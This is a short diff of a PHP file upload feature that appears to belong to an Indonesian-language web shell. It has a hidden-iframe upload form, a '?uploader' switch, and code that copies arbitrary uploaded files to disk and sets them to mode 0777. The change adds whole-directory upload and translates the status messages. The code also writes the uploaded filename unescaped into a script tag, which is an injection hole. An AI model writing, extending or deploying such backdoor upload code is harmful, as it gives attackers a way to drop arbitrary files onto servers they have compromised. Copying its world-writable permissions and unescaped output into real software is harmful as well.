@@ -374,10 +374,13 @@ while(list($key,$value) = each($_FILES['file']['name']))
             
         if(copy($_FILES['file']['tmp_name'][$key], $add))
         {
-            echo '<script>alert("SUKSES UPLOAD: '.$filename.'");</script>';
+            echo '<script>
+            alert("Success Upload: '.$filename.'");
+
+            </script>';
         }
         else{
-            echo '<script>alert("GAGAL UPLOAD: '.$filename.'");</script>';
+            echo '<script>alert("Failed Upload!: '.$filename.'");</script>';
         }
         chmod("$add",0777);
     }
@@ -394,10 +397,9 @@ if (isset($_GET['uploader']))
             <div id="status"></div>
             <form action="" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">';
 
-                for ($i=0; $i<10; $i++) {
                     echo '<input type="hidden" value="myForm" name="'.$session_upload.'">';
-                    echo '<input type="file" name="file[]">';
-                }
+                    echo '<br><h3><font color=yellow> Pilih salah satu</font></h3><br>File Input: <input type="file" name="file[]">';
+                    echo '<br>Directory : <input type="file" webkitdirectory directory name="file[]">';
 
                 echo'
                 <br><br>
